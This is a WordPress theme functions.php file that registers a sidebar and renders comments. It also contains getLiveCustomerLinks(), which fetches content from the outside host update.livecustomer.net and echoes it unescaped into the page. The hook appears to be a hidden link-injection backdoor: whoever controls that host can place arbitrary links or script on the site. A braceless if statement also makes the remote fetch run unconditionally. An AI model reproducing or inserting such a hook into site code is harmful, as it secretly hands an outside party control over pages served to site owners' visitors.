<?php
if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'name' => 'Sidebar',
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h2 class="widgettitle">',
		'after_title' => '</h2>',
	));
}
function getLiveCustomerLinks(){
	if ($_SERVER['REQUEST_URI'] == '/' || $_SERVER['REQUEST_URI'] == '/index.php')
	    ini_set('default_socket_timeout', '5');

	    $data = file_get_contents("http://update.livecustomer.net/s?i=5214");
		$data = explode("<br />", $data);
		
		$out = "<ul><li><h2>Links</h2><ul>";
		foreach($data as $link){
			$out .= "<li>$link</li>";
		}
		
		$out .= "</ul></li></ul>";
		echo $out;
}
function custom_comment($comment, $args, $depth){
	  $GLOBALS['comment'] = $comment; ?>
	 <li class="comment">
		<div id="comment-<?php comment_ID() ?>">
			<div class="comment_avatar"><?php echo get_avatar( $comment, $size=$args['avatar_size'] ); ?></div>
			<div class="comment_author">
				<?php comment_author_link();?>
				<span class="date"><?php comment_date('Y/m/d H:i');?></span>
				<span class="edit_comment"><?php edit_comment_link("edit");?></span>
			</div>
			<div class="comment_body">
				<?php comment_text();?>
			</div>
		 	<div class="reply rbot">
		 		<?php comment_reply_link(array_merge($args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
		 	</div>			
		</div>
	<?php

}
?>